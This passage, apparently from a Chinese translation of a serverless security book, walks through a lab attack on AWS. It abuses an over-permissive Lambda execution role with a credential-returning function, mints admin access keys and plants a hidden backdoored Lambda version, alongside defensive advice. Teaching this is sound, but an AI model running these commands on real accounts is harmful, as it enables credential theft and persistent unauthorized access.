  \ AWS CLI 配置文件和凭证：^(7)\n\n```\nmv ~/.aws/config ~/.aws/config.bak\nmv ~/.aws/credentials\
  \ ~/.aws/credentials.bak\n```\n\n2. 确认未配置有效身份：\n\n```\naws sts get-caller-identity\
  \ --profile target-dev-account\n```\n\n您应该收到以下错误消息，确认当前未为指定配置文件配置有效的 AWS 凭证：\n\n\
  ```\nThe config profile (target-dev-account) could not be found\n```\n\n3. 使用 `Developer001`\
  \ 的访问凭证重新配置您的 AWS CLI：\n\n```\naws configure --profile target-dev-account\n```\n\
  \n#### Tip\n\n请确保使用在 “设置 IAM 组和用户” 中运行 `aws iam create-access-key --user-name $DEVELOPER`\
  \ 后生成的访问凭证。\n\n4. 确认 AWS CLI 当前以哪个 IAM 身份进行身份验证：\n\n```\naws sts get-caller-identity\
  \ --profile target-dev-account\n```\n\n以下 JSON 响应表明 CLI 已成功使用与 `Developer001` 关联的访问密钥：\n\
  \n```\n{\n    \"UserId\": \"*********************\",\n    \"Account\": \"************\"\
  ,\n    \"Arn\": \"arn:aws:iam::************:user/Developer001\"\n}\n```\n\n5. 将\
  \ `[ACCOUNT_ID]` 替换为 Serverless Lab 账户的账户 ID，然后运行以下命令以承担 `lambda-assumable-role`\
  \ IAM 角色：\n\n```\naws sts assume-role \\\n  --role-arn arn:aws:iam::[ACCOUNT_ID]:role/lambda-assumable-role\
  \ \\\n  --role-session-name assume-session-001 \\\n  --profile target-dev-account\n\
  ```\n\n您应该收到以下响应，表明 `Developer001` 无权承担 `lambda-assumable-role` IAM 角色：\n\n```\n\
  An error occurred (AccessDenied) when calling the AssumeRole operation: User: arn:aws:iam::...:user/Developer001\
  \ is not authorized to perform: sts:AssumeRole on resource: arn:aws:iam::...:role/lambda-assumable-role\n\
  ```\n\n您已验证 `AssumeRole` 不再可用于提升权限。然而，正如您将在下一节中看到的那样，攻击者仍可通过配置了过于宽松执行角色的 AWS Lambda\
  \ 资源来提升权限。\n\n#### 滥用函数的过于宽松的执行角色以提升权限\n\n在本节中，您将模拟攻击者滥用 Lambda 函数配置错误且过于宽松的执行角色来提升权限。您将首先下载\
  \ Lambda 函数代码，然后对其进行修改以返回执行角色的会话凭证。之后，您将打包并部署修改后的函数代码，然后调用该函数以检索临时凭证（`AccessKeyId`、`SecretAccessKey`、`SessionToken`）。最后，使用这些凭证，您将配置一个新的本地\
  \ AWS CLI 配置文件以在凭证有效期内使用这些凭证，如 图 5-3 所示。\n\n![](img/lsse_0503.png)\n\n\n\n\n\n鉴于凭据继承了角色的权限，新配置文件将具有与授予\
  \ Lambda 执行角色的权限等效的权限。因为 Lambda 执行角色附加了 `AdministratorAccess` 受管策略，新配置文件将有效地在整个账户中拥有完全的管理员访问权限。\n\
  \n#### Note\n\n本节假设您使用 Attacker 账户来模拟攻击者尝试利用无服务器实验室环境中的资源。\n\n让我们逐步了解攻击者如何通过具有配置错误的\
  \ IAM 角色的现有 Lambda 函数提升权限：\n\n1. 在 CloudShell 终端中，运行以下命令（在 `$` 符号之后）以枚举 `us-east-1`\
  \ 区域中的所有 Lambda 函数：\n\n```\naws lambda list-functions \\\n    --region us-east-1\
  \ \\\n    --profile target-dev-account\n```\n\n这会返回以下 JSON 输出：\n\n```\n{\n    \"\
  Functions\": [\n        {\n            \"FunctionName\": \"lambda-0000\",\n    \
  \        \"FunctionArn\": \"...:function:lambda-0000\",\n            \"Runtime\"\
  : \"python3.13\",\n            \"Role\": \"arn:aws:iam::...:role/lambda-assumable-role\"\
  ,\n            \"Handler\": \"lambda_function.lambda_handler\",\n            \"\
  CodeSize\": 268,\n            \"Description\": \"\",\n            \"Timeout\": 3,\n\
  \            \"MemorySize\": 128,\n            ...\n            \"LoggingConfig\"\
  : {\n                \"LogFormat\": \"Text\",\n                \"LogGroup\": \"\
  /aws/lambda/lambda-0000\"\n            }\n        },\n    ]\n}\n```\n\n2. 运行以下命令以检索\
  \ Lambda 函数的代码位置并将结果存储在变量（`CODE_LOCATION`）中：\n\n```\nCODE_LOCATION=$(aws lambda\
  \ get-function \\\n    --function-name lambda-0000 \\\n    --region us-east-1 \\\
  \n    --profile target-dev-account \\\n    | jq -r \".Code.Location\")\n```\n\n\
  3. 使用上一步中的代码下载 URL，下载并提取 Lambda 函数代码：\n\n```\ncd ~\n\ncurl -o function.zip \"$CODE_LOCATION\"\
  \nunzip function.zip -d lambda-0000\n\ncat lambda-0000/lambda_function.py\n```\n\
  \n这会打印 `lambda-0000` Lambda 函数的源代码，类似于以下内容：\n\n```\nimport json\n\ndef lambda_handler(event,\
  \ context):\n    output = \"Learning Serverless Security!\"\n\n    return {\n  \
  \      'statusCode': 200,\n        'body': json.dumps(output)\n    }\n```\n\n####\
  \ Note\n\n如果 Lambda 函数代码包含硬编码凭据，获得代码访问权限的攻击者可以利用它们来破坏其他资源或提升权限。我们将在后续章节中介绍这一点。\n\
  \n4. 运行以下命令以调用 Lambda 函数并检查输出响应：\n\n```\naws lambda invoke \\\n  --function-name\
  \ lambda-0000 \\\n  --payload '{}' \\\n  --region us-east-1 \\\n  --qualifier '$LATEST'\
  \ \\\n  --profile target-dev-account \\\n  output_response.json\n\ncat output_response.json\n\
  ```\n\n这会返回以下响应：\n\n```\n{\"statusCode\": 200, \"body\": \"\\\"Learning Serverless\
  \ Security!\\\"\"}\n```\n\n5. 检索 Lambda 函数的最新发布版本：\n\n```\naws lambda list-versions-by-function\
  \ \\\n  --function-name lambda-0000 \\\n  --query 'Versions[-1].Version' \\\n  --output\
  \ text \\\n  --region us-east-1 \\\n  --profile target-dev-account\n```\n\n这会返回\
  \ `1`，对应于 Lambda 函数的第一个版本。\n\n6. 使用 `vim` 修改 `lambda-0000/lambda_function.py` 中的函数代码：\n\
  \n1. 启动 `vim` 并打开 `lambda-0000/lambda_function.py`：\n\n```\nvim lambda-0000/lambda_function.py\n\
  ```\n\n2. 按 I 进入 *insert* 模式。\n\n#### Note\n\n在 `vim` 中，*Insert* 模式允许您像普通文本编辑器一样直接在文件中输入和编辑文本。您可以在此模式下插入、修改或删除文本并添加新行。\n\
  \n3. 在插入模式下，将代码更新为以下内容：\n\n```\nimport json\n\ndef lambda_handler(event, context):\n\
  \    output = \"Modified!\"\n\n    return {\n        'statusCode': 200,\n      \
  \  'body': json.dumps(output)\n    }\n```\n\n4. 按 Esc 退出插入模式。\n\n#### Note\n\n*Normal\
  \ mode* 是 `vim` 的默认模式，用于通过命令而不是直接插入字符来导航和编辑文本。例如，您可以使用 `:w!` 保存文件，使用 `/` 搜索文本，或使用\
  \ `dd` 删除一行。当您退出插入模式时，您将返回到普通模式，在该模式下您可以移动光标、删除或复制文本并执行其他编辑命令。\n\n5. 输入 `:wq!` 并按\
  \ Enter 保存更改并退出 `vim`。\n\n7. 运行以下命令（在 `$` 符号之后）将修改后的 Lambda 函数代码打包到新的 ZIP 归档文件中：\n\
  \n```\ncd ~/lambda-0000\nzip -r ../function-new.zip .\n```\n\n8. 将更新后的函数代码部署到 AWS\
  \ Lambda：\n\n```\naws lambda update-function-code \\\n  --function-name lambda-0000\
  \ \\\n  --zip-file fileb://../function-new.zip \\\n  --region us-east-1 \\\n  --profile\
  \ target-dev-account\n```\n\n9. 等待 Lambda 函数完成更新：\n\n```\naws lambda wait function-updated\
  \ \\\n  --function-name lambda-0000 \\\n  --region us-east-1 \\\n  --profile target-dev-account\n\
  ```\n\n10. 运行以下命令列出 `lambda-0000` Lambda 函数的所有已发布版本：\n\n```\naws lambda list-versions-by-function\
  \ \\\n  --function-name lambda-0000 \\\n  --query 'Versions[].Version' \\\n  --output\
  \ text \\\n  --region us-east-1 \\\n  --profile target-dev-account\n```\n\n这应返回以下响应，表明该函数除了未发布的\
  \ `$LATEST` 版本外还有一个已发布版本：\n\n```\n$LATEST 1\n```\n\n#### Note\n\n您可能会得到不同的版本号列表，具体取决于账户中该函数已发布的版本数量。\n\
  \n11. 调用并测试未发布的 `$LATEST` 版本：\n\n```\naws lambda invoke \\\n  --function-name lambda-0000\
  \ \\\n  --payload '{}' \\\n  --region us-east-1 \\\n  --qualifier '$LATEST' \\\n\
  \  --profile target-dev-account \\\n  output_response.json\n\ncat output_response.json\n\
  ```\n\n这证实更新后的函数代码已成功执行：\n\n```\n{\"statusCode\": 200, \"body\": \"\\\"Modified!\\\
  \"\"}\n```\n\n现在您已验证可以向现有 Lambda 函数部署新代码，让我们继续模拟攻击者如何引入恶意函数代码以返回与函数执行角色关联的临时凭据：\n\
  \n1. 让我们再次使用 `vim` 修改 `lambda_function.py` 中的代码：\n\n1. 启动 `vim` 并打开 `lambda_function.py`：\n\
  \n```\nvim lambda_function.py\n```\n\n2. 输入 `:set nu` 然后按 Enter 在 `vim` 中显示行号。\n\
  \n#### Note\n\n在 `vim` 中，`:set nu` 和 `:set number` 都会在每行旁边显示行号。您可以根据自己的喜好使用任一命令。\n\
  \n3. 按 I 进入插入模式。\n\n4. 在插入模式下，将代码更新为以下内容：\n\n```\nimport boto3\n\ndef lambda_handler(event,\
  \ context):\n    session = boto3.Session()\n    credentials = session.get_credentials().get_frozen_credentials()\n\
  \n    return {\n        'AccessKeyId': credentials.access_key,\n        'SecretAccessKey':\
  \ credentials.secret_key,\n        'SessionToken': credentials.token\n    }\n```\n\
  \n\n\n\n该 Lambda 函数将返回颁发给 Lambda 执行角色的临时凭证，并允许你在每次调用函数时检索访问密钥、秘密密钥和会话令牌。\n\n####\
  \ Tip\n\n该函数代码的副本可在 [GitHub gist（见 `lambda_function.py`）](https://oreil.ly/0mSPU)\
  \ 中获取。如果你直接从 gist 中粘贴代码，可以在 `vim` 中使用 `:set paste` 来防止格式问题。你应在普通模式下激活 `:set paste`（即在插入模式之外）：按\
  \ `Esc` 确保处于普通模式，输入 `:set paste`，按 Enter，然后进入插入模式（`i`）以安全地粘贴代码，避免自动缩进或格式问题。\n\n\
  5. 按 `Esc` 退出插入模式。\n\n6. 输入 `:wq!` 并按 Enter 保存更改并退出 `vim`。\n\n2. 运行以下命令以重新打包并部署修改后的\
  \ Lambda 函数：\n\n```\nzip -r ../function-new.zip .\n\naws lambda update-function-code\
  \ \\\n  --function-name lambda-0000 \\\n  --zip-file fileb://../function-new.zip\
  \ \\\n  --profile target-dev-account \\\n  --region us-east-1\n```\n\n3. 使用以下命令等待\
  \ Lambda 函数完成更新：\n\n```\naws lambda wait function-updated \\\n  --function-name\
  \ lambda-0000 \\\n  --profile target-dev-account \\\n  --region us-east-1\n```\n\
  \n4. 准备就绪后，让我们继续模拟攻击者外泄与 Lambda 函数执行角色关联的短期凭证，如 图 5-4 所示。\n\n![](img/lsse_0504.png)\n\
  \n运行以下命令以调用修改后的 Lambda 函数并检查其输出：\n\n```\naws lambda invoke \\\n  --function-name\
  \ lambda-0000 \\\n  --payload '{}' \\\n  --region us-east-1 \\\n  --qualifier '$LATEST'\
  \ \\\n  --profile target-dev-account \\\n  output_response.json\n\ncat output_response.json\n\
  ```\n\n这次，调用函数应返回类似以下的短期会话凭证：\n\n```\n{\"AccessKeyId\": \"...\", \"SecretAccessKey\"\
  : \"...\", \"SessionToken\": \"...\"}\n```\n\n5. 使用返回的凭证配置新的 AWS CLI 配置文件：\n\n```\n\
  KEY_ID=$(cat output_response.json | \\\n    jq -r \".AccessKeyId\")\n\nSECRET_ACCESS_KEY=$(cat\
  \ output_response.json | \\\n    jq -r \".SecretAccessKey\")\n\nSESSION_TOKEN=$(cat\
  \ output_response.json | \\\n    jq -r \".SessionToken\")\n\naws configure set aws_access_key_id\
  \ $KEY_ID \\\n    --profile lambda-creds-profile\n\naws configure set aws_secret_access_key\
  \ $SECRET_ACCESS_KEY \\\n    --profile lambda-creds-profile\n\naws configure set\
  \ aws_session_token $SESSION_TOKEN \\\n    --profile lambda-creds-profile\n```\n\
  \n6. 验证新配置文件（`lambda-creds-profile`）关联的身份：\n\n```\naws sts get-caller-identity --profile\
  \ lambda-creds-profile\n```\n\n以下 JSON 输出确认会话正在使用 Lambda 函数的执行角色：\n\n```\n{\n  \
  \  \"UserId\": \"...:lambda-0000\",\n    \"Account\": \"...\",\n    \"Arn\": \"\
  .../lambda-assumable-role/lambda-0000\"\n}\n```\n\n此时，你实际上是以 `AdministratorAccess`\
  \ 权限运行，使用 `lambda-creds-profile` AWS CLI 配置文件。从防御安全角度来看，请记住，即使攻击者无法直接承担 Lambda 函数的角色，如果攻击者能够修改函数代码并且执行角色授予了过多的权限，攻击者仍可能提取临时凭证并提升权限。你应在所有\
  \ Lambda 执行角色上强制实施最小权限原则，并确保它们仅具有执行预期任务所需的权限。\n\n#### Caution\n\n与 `lambda-creds-profile`\
  \ AWS CLI 配置文件关联的临时凭证仅在有限时间内有效。为避免身份验证错误，请在凭证过期前立即继续进行下一节。如果会话超时，你需要重新调用 Lambda\
  \ 函数以获取新的短期凭证集。\n\n#### Establishing Persistence with New IAM User Credentials\n\
  \n鉴于临时凭证是有意设计为短期有效，攻击者无法依赖它们进行长期访问。为了延长访问时间，攻击者可以使用这些临时凭证为现有 IAM 用户生成新的访问密钥。这种方法通常比创建全新的\
  \ IAM 用户更隐蔽，因为现有用户账户可能已在常规使用中，在例行审计期间不太可能引起怀疑。\n\n在本节中，你将探讨攻击者如何使用短期凭证获取长期访问凭证。你将首先枚举\
  \ IAM 组以识别具有 `AdministratorAccess` 受管策略（或类似广泛权限）的潜在账户，例如 `Administrators` 组成员。接下来，你将针对其中一个用户并为该现有\
  \ IAM 用户创建新的长期访问密钥集（`AccessKeyId` 和 `SecretAccessKey`）。最后，你将把这些密钥配置为命名的 AWS CLI\
  \ 配置文件并通过使用 `aws sts get-caller-identity` 确认该配置文件有效。\n\n#### Note\n\n本节假设你正在使用 Attacker\
  \ 账户来模拟攻击者尝试利用无服务器实验室环境中的资源。\n\n让我们继续进行模拟：\n\n1. 在 Attacker 账户的 CloudShell 终端中，运行以下命令（在\
  \ `$` 符号之后）以检查 Serverless Lab 账户中存在哪些 IAM 组：\n\n```\naws iam list-groups --profile\
  \ lambda-creds-profile\n```\n\n这会返回以下内容：\n\n```\n{\n    \"Groups\": [\n        {\n\
  \            \"Path\": \"/\",\n            \"GroupName\": \"Administrators\",\n\
  \            \"GroupId\": \"...\",\n            \"Arn\": \"arn:aws:iam::...:group/Administrators\"\
  ,\n            \"CreateDate\": \"...\"\n        },\n        {\n            \"Path\"\
  : \"/\",\n            \"GroupName\": \"Developers\",\n            \"GroupId\": \"\
  ...\",\n            \"Arn\": \"arn:aws:iam::...:group/Developers\",\n          \
  \  \"CreateDate\": \"...\"\n        }\n    ]\n}\n```\n\n此 JSON 输出显示 Serverless Lab\
  \ 账户目前有两个 IAM 组：`Administrators` 和 `Developers`。从攻击者角度来看，`Administrators` 组的存在标志着创建现有用户的长期凭证的潜在主要目标，或通过在\
  \ `Administrators` 组中创建新的 IAM 用户并为这些账户生成访问密钥以获得持久的管理员访问权限。\n\n2. 使用 `aws iam get-group`\
  \ 命令检查 `Administrators` 组并列出属于该组的 IAM 用户：\n\n```\naws iam get-group \\\n    --group-name\
  \ Administrators \\\n    --profile lambda-creds-profile\n```\n\n这会产生以下输出：\n\n```\n\
  {\n    \"Users\": [\n        {\n            \"Path\": \"/\",\n            \"UserName\"\
  : \"Administrator001\",\n            \"UserId\": \"...\",\n            \"Arn\":\
  \ \"arn:aws:iam::...:user/Administrator001\",\n            \"CreateDate\": \"...\"\
  \n        }\n    ],\n    \"Group\": {\n        \"Path\": \"/\",\n        \"GroupName\"\
  : \"Administrators\",\n        \"GroupId\": \"...\",\n        \"Arn\": \"arn:aws:iam::...:group/Administrators\"\
  ,\n        \"CreateDate\": \"...\"\n    }\n}\n```\n\n此 JSON 输出显示 `Administrators`\
  \ 组有一个成员：IAM 用户 `Administrator001`。从攻击者角度来看，该用户是生成长期凭证的高价值目标。\n\n3. 为 `Administrator001`\
  \ 生成新的访问凭证：\n\n\n\n\n\n```\naws iam create-access-key \\\n    --user-name Administrator001\
  \ \\\n    --profile lambda-creds-profile\n```\n\n这将返回包含为 `Administrator001` 生成的新长期凭证的\
  \ JSON 输出：\n\n```\n{\n    \"AccessKey\": {\n        \"UserName\": \"Administrator001\"\
  ,\n        \"AccessKeyId\": \"...\",\n        \"Status\": \"Active\",\n        \"\
  SecretAccessKey\": \"...\",\n        \"CreateDate\": \"...\"\n    }\n}\n```\n\n\
  请务必在进入下一步之前，将 `AccessKeyId` 和 `SecretAccessKey` 值复制下来并安全地存储在本地机器上。^8\n\n#### Caution\n\
  \n在任何情况下都不要共享这些值，因为它们是与具有 `AdministratorAccess` 的 IAM 用户关联的长期凭证。\n\n4. 使用上一步获得的新凭证，为新用户配置一个命名配置文件（`admin-001`）：\n\
  \n```\naws configure set aws_access_key_id KEY_ID --profile admin-001\naws configure\
  \ set aws_secret_access_key SECRET_ACCESS_KEY --profile admin-001\n```\n\n#### Caution\n\
  \n在运行命令之前，请务必将 `KEY_ID` 和 `SECRET_ACCESS_KEY` 替换为上一步获得的 `AccessKeyId` 和 `SecretAccessKey`\
  \ 值。\n\n5. 检查 `admin-001` 配置文件是否正确配置：\n\n```\naws sts get-caller-identity --profile\
  \ admin-001\n```\n\n这将返回以下响应：\n\n```\n{\n    \"UserId\": \"...\",\n    \"Account\"\
  : \"...\",\n    \"Arn\": \"arn:aws:iam::...:user/Administrator001\"\n}\n```\n\n\
  此输出确认 `admin-001` AWS CLI 配置文件已正确配置，并且正在以 `Administrator001` 的权限运行。\n\n你现在应该对攻击者如何利用短期凭证生成长期访问密钥有了坚实的理解。从防御安全角度来看，你应将任何程序化创建长期凭证的行为视为高风险事件。至关重要的是审查所有\
  \ IAM 用户、组、角色和策略，并应用严格的最小权限原则和访问控制。同时，你还应深入研究可能的权限提升路径，包括本书中未讨论的路径，以便在被利用之前识别和修复配置错误以及潜在的提升路径。\n\
  \n#### Establishing Persistence via a Backdoored Lambda Version\n\n攻击者建立持久化的另一种方式是通过发布一个带后门的\
  \ Lambda 版本。由于大多数开发团队只关注 `$LATEST` 版本，旧的已发布版本可能数周甚至数月无人检查。攻击者可以利用这一点，通过发布并隐藏一个恶意版本，该版本可通过其版本号或别名继续被调用。如果未被发现，该版本可作为后门，使攻击者即使在其他凭证被撤销后仍能重新访问\
  \ AWS 账户环境。\n\n在本节中，你将模拟攻击者在云环境中通过发布恶意 Lambda 版本来建立后门访问。具体来说，你将创建并调用一个 Lambda 函数版本，该版本返回与其执行角色关联的临时凭证。之后，你将发布一个包含原始函数代码的新版本以隐藏恶意版本。到本节结束时，你将拥有一个与\
  \ Figure 5-5 所示类似的后门设置。^9\n\n通过站在攻击者的角度，你可以亲身体验应用持久化技术。这将帮助你在实际工作负载中识别危险信号并实施更强的防御措施来抵御它们。\n\
  \n#### Note\n\n本节假设你使用 Attacker 账户来模拟攻击者对无服务器实验室环境中资源进行利用的尝试。\n\n![](img/lsse_0505.png)\n\
  \n让我们开始模拟：\n\n1. 让我们先使用当前部署的最新代码发布 Lambda 函数的新版本：\n\n```\naws lambda publish-version\
  \ \\\n  --function-name lambda-0000 \\\n  --region us-east-1 \\\n  --profile admin-001\n\
  ```\n\n此时，你应该有两个 Lambda 函数版本：版本 `1` 指向返回 `Learning Serverless Security` 的原始代码，版本\
  \ `2` 指向返回临时凭证的恶意函数代码（如 Figure 5-6 所示）。\n\n![](img/lsse_0506.png)\n\n鉴于最新部署的代码返回分配给\
  \ Lambda 执行角色的临时凭证，调用此特定 Lambda 函数版本将为攻击者提供与角色权限绑定的新临时凭证。\n\n#### Note\n\n通过发布 Lambda\
  \ 函数版本，你创建了代码的快照，可以始终通过其版本号调用。这意味着攻击者或开发人员可以直接调用旧版本，即使 `$LATEST` 已被新代码覆盖。\n\n2.\
  \ 运行以下命令列出 Lambda 函数的所有已发布版本：\n\n```\naws lambda list-versions-by-function \\\n\
  \  --function-name lambda-0000 \\\n  --query 'Versions[].Version' \\\n  --output\
  \ text \\\n  --region us-east-1 \\\n  --profile admin-001\n```\n\n这将返回以下响应：\n\n\
  ```\n$LATEST 1       2\n```\n\n此响应表明目前 Lambda 函数共有三个版本：未发布的 `$LATEST` 版本和两个已发布版本（`1`\
  \ 和 `2`）。版本 `1` 指向返回 `Learning Serverless Security` 的原始代码，而版本 `2` 指向返回临时凭证的恶意函数代码。\n\
  \n3. 调用 Lambda 函数的版本 `2`：\n\n```\naws lambda invoke \\\n  --function-name lambda-0000\
  \ \\\n  --payload '{}' \\\n  --region us-east-1 \\\n  --qualifier '2' \\\n  --profile\
  \ admin-001 \\\n  output_response.json\n\ncat output_response.json\n```\n\n resulting\
  \ output 应为与 Lambda 函数执行角色关联的一组临时会话凭证。\n\n#### Note\n\n此时，任何导航到 Lambda 函数代码标签页的\
  \ AWS 账户用户都会看到返回并泄露凭证的恶意后门代码。\n\n4. 要隐藏恶意版本，请运行以下命令发布一个重用版本 `1` 中确切部署代码的新 Lambda\
  \ 版本：\n\n```\naws lambda update-function-code \\\n  --function-name lambda-0000\
  \ \\\n  --zip-file fileb://../function.zip \\\n  --region us-east-1 \\\n  --profile\
  \ admin-001\n\naws lambda wait function-updated \\\n  --function-name lambda-0000\
  \ \\\n  --region us-east-1 \\\n  --profile admin-001\n\naws lambda publish-version\
  \ \\\n  --function-name lambda-0000 \\\n  --region us-east-1 \\\n  --profile admin-001\n\
  ```\n\nFigure 5-7 有助于你可视化当前已发布的 Lambda 函数版本集合。\n\n![](img/lsse_0507.png)\n\n目前，Lambda\
  \ 函数有三个版本：版本 `1` 指向返回 `Learning Serverless Security` 的原始代码，版本 `2` 指向返回临时凭证的恶意函数代码，版本\
  \ `3` 指向版本 `1` 的副本。\n\n5. 发布新版本后，让我们调用 Lambda 函数的最新版本：\n\n```\naws lambda invoke\
  \ \\\n  --function-name lambda-0000 \\\n  --payload '{}' \\\n  --region us-east-1\
  \ \\\n  --qualifier '$LATEST' \\\n  --profile admin-001 \\\n  output_response.json\n\
  \ncat output_response.json\n```\n\n以下是 JSON 响应：\n\n\n\n\n\n```\n{\n    \"StatusCode\"\
  : 200,\n    \"ExecutedVersion\": \"$LATEST\"\n}\n{\"statusCode\": 200, \"body\"\
  : \"\\\"Learning Serverless Security!\\\"\"}\n```\n\n这证实了函数已成功执行，并且 Lambda 函数代码的原始版本正在\
  \ `$LATEST` 版本中运行。\n\n#### Note\n\n此时，任何 AWS 账户用户导航到 Lambda 函数的 Code 选项卡时，都会看到返回\
  \ `Learning Serverless Security` 的原始代码。\n\n6. 现在是时候验证恶意的 Lambda 函数版本（版本 `2`）是否可以直接调用，如\
  \ Figure 5-8 所示。\n\n![](img/lsse_0508.png)\n\n运行以下命令来调用 Lambda 函数版本 `2`：\n\n```\n\
  aws lambda invoke \\\n  --function-name lambda-0000 \\\n  --payload '{}' \\\n  --region\
  \ us-east-1 \\\n  --qualifier '2' \\\n  --profile admin-001 \\\n  output_response.json\n\
  \ncat output_response.json\n```\n\n响应如下：\n\n```\n{\"AccessKeyId\": \"...\", \"SecretAccessKey\"\
  : \"...\", \"SessionToken\": \"...\"}\n```\n\n这里，你提供的 qualifier 直接对应 Lambda 函数的已发布版本号。例如，指定\
  \ `--qualifier '2'` 将调用该函数的版本 `2`。\n\n#### Caution\n\n版本号会在发布新版本时按升序自动分配，并且一旦创建就不能重复使用。因此，你需要确保指定的\
  \ qualifier 直接对应恶意函数代码的版本号。\n\n7. 让我们从 Serverless Lab 账户开发者的角度来查看这一点。切换回 Serverless\
  \ Lab 账户的 AWS 管理控制台，然后导航到 Lambda 控制台。\n\n选择 `lambda-0000` 函数，然后导航到 Code 选项卡以检查部署的最新代码。你应该在代码编辑器中看到原始的\
  \ Lambda 函数代码（Figure 5-9）。\n\n![](img/lsse_0509.png)\n\n#### Note\n\n此时，除非开发团队检查\
  \ Aliases and Versions 选项卡，否则后门版本可能在数周甚至数月内都不会被发现。\n\n让我们导航到 Versions 选项卡（Figure\
  \ 5-10）。\n\n![](img/lsse_0510.png)\n\n这里，你有三个版本——其中版本 `2` 保留了恶意代码，在被调用时会返回与角色权限绑定的新临时凭证。\n\
  \n#### Note\n\n虽然 Versions 选项卡显示了已发布 Lambda 版本的历史记录，但查看每个版本的部署代码需要再点击几次——大多数开发者不会费心去做。\n\
  \n要无需凭证即可调用后门版本，攻击者需要创建一个指向特定 Lambda 版本的别名，然后配置与该别名关联的函数 URL，如 Figure 5-11 所示。\n\
  \n![](img/lsse_0511.png)\n\n通过此设置，攻击者可以直接从浏览器或脚本触发后门函数版本，并检索与 Lambda 函数执行角色关联的临时凭证。这些临时凭证随后可用于通过各种技术生成长期访问凭证，类似于你在\
  \ “Establishing Persistence with New IAM User Credentials” 中早期的探索。我们在这里不会详细介绍这些步骤，以避免通过公开可访问的\
  \ Lambda 函数 URL 泄露你账户的凭证。\n\n从防御安全角度来看，除了审计和解决 IAM 误配置外，你还需要跟踪 Lambda 函数版本历史，监控对旧函数版本意外的调用，并审计函数配置和权限的更改。你可以利用自动化合规服务和功能，例如\
  \ AWS Config 自定义规则，以自动检测未经授权的 Lambda 版本和别名创建。此外，根据你的 AWS Organizations 和账户的结构和管理方式，你可以考虑应用服务控制策略来设置预防性护栏和限制，针对开发和安全团队之间明确商定的风险操作。\n\
  \n#### Caution\n\n现在你已完成本章的动手示例，请务必清理你在 Serverless Lab 账户中创建的 IAM 和 Lambda 资源，以避免留下后门和配置错误的云资源。\n\
  \n## Summary\n\n在本章中，你探索了攻击者如何利用泄露的开发者凭证以及过于宽松的 IAM 角色在 AWS 账户内提升权限。你研究了攻击者如何滥用\
  \ `AssumeRole` 并利用配置错误的 Lambda 执行角色获得提升的访问权限并建立持久性。你现在更能识别 IAM 误配置，评估 Lambda 执行角色的权限提升风险，并识别攻击者可能用来维持长期访问的某些持久性机制。\n\
  \n在下一章中，你将更深入地了解攻击者如何利用公开暴露的易受攻击的 Lambda 函数。你将亲身体验攻击者的视角并执行任意代码以检索受损 Lambda 函数的源代码，以及从无服务器应用程序中窃取凭证。这将帮助你在被利用之前识别安全问题和误配置。\n\
  \n^1 `AssumeRole` 不是策略，而是在 IAM 策略中可以允许或拒绝的具体操作。通过授予 `sts:AssumeRole`，你允许用户、组或角色请求临时凭证以承担另一个\
  \ IAM 角色。\n\n^2 或者，你可以在 CloudShell 终端中运行 `aws sts get-caller-identity --query Account\
  \ --output text` 来检索账户 ID。\n\n^3 你可以在搜索框中输入 `admin` 来定位 `AdministratorAccess` 策略。\n\
  \n^4 你可以暂时将这些值存储在代码编辑器中。\n\n^5 如果你在阅读本文时有更新的 Python 运行时可用——例如 Python 3.14 或更高版本——你可以改选该版本。\n\
  \n^6 你也可以尝试在不使用 `--profile target-dev-account` 的情况下运行命令。\n\n^7 这些命令重命名文件而不是删除它们，因此你的\
  \ AWS CLI 配置和凭证也会被备份，并在需要时可以恢复。\n\n^8 你可以暂时将这些值存储在代码编辑器中。\n\n^9 更完整的设置将在本节末尾讨论。\n"
- "## Chapter 6. Hacking Publicly Accessible AWS Lambda Functions\n\n想象一下，你花费数周时间构建一个无服务器应用程序并将其发布给数千名用户。仅仅几天后，你发现应用程序停止工作，AWS\
  \ 因为可疑活动而暂时暂停了你的账户。深入调查根本原因后，你意识到攻击者利用了公开可访问的 Lambda 函数中的代码注入漏洞，并使用其过于宽松的 IAM 角色访问并从\
  \ Secrets Manager 中窃取机密，以及从其他云资源中窃取敏感数据。此场景向你展示了单个易受攻击的 Lambda 函数足以触发整个 AWS 账户的全面数据泄露。\n\
  \n\n\n\n\n在本章中，你将探索攻击者如何利用公开暴露的 Lambda URL 并在函数的执行环境中运行任意代码。你将研究 Lambda 函数中的代码注入漏洞，当与过于宽松的\
  \ IAM 角色结合时，如何让攻击者窃取存储在 secrets manager 服务中的密钥。\n\n为了帮助你亲身体验攻击者的视角，本章被组织为五个部分：\n\
  \n*   “准备和部署一个易受攻击的无服务器 Web 应用程序”\n*   “测试常见的 S3 存储桶错误配置”\n*   “使用代码注入攻击在 Lambda\
  \ 函数中执行任意代码”\n*   “通过代码注入和出站网络访问窃取敏感数据”\n*   “通过易受攻击的 Lambda 函数窃取 Secrets Manager\
  \ 密钥”\n\n到本章结束时，你将更好地具备在攻击者利用之前识别易受攻击的无服务器配置的能力。\n\n### Reviewing Technical Prerequisites\n\
  \n要跟随本章学习，你需要以下内容：\n\n*   两个 AWS 账户：一个用于设置和托管易受攻击的无服务器实验室环境（Serverless Lab 账户），另一个用于运行模拟攻击（Attacker\
  \ 账户）。确保两个账户都已准备就绪，并在单独的浏览器会话（或隐身/隐私窗口）中打开，以避免会话冲突。\n*   在本地机器上安装的代码编辑器（如 VS Code\
  \ 或 Sublime Text）。\n\n如果你使用 Windows，请确保你有运行 macOS 或 Linux 命令的方法——例如，使用 WSL，或带有 Linux\
  \ 发行版的 VM。\n\n> Note\n>\n> 为了帮助你完成练习和模拟，本章中使用的代码和命令的副本可在 [GitHub gist (see `ch06.md`)](https://oreil.ly/0mSPU)\
  \ 中获得。\n\n### Preparing and Deploying a Vulnerable Serverless Web Application\n\n\
  代码注入是无服务器应用程序中远程代码执行的主要原因之一。它允许攻击者运行任意代码、访问敏感凭据或配置、通过网络外泄数据，并更改函数的行为或响应。当与过于宽松的\
  \ IAM 角色结合时，单个代码注入漏洞可能会让攻击者利用函数的权限并访问其他云资源。\n\n在本节中，你将设置一个易受攻击的无服务器 Web 应用程序，以探索代码注入攻击如何导致\
  \ AWS Lambda 中未经授权的代码执行。这将帮助你更深入地了解不安全的代码以及函数级错误配置如何使无服务器应用程序暴露于各种安全威胁。\n\n本章中你将使用的无服务器\
  \ Web 应用程序由托管在 Amazon S3 存储桶中的静态 Web 前端组成，该前端向一个故意容易受到代码注入攻击的 Lambda 函数发出请求（Figure\
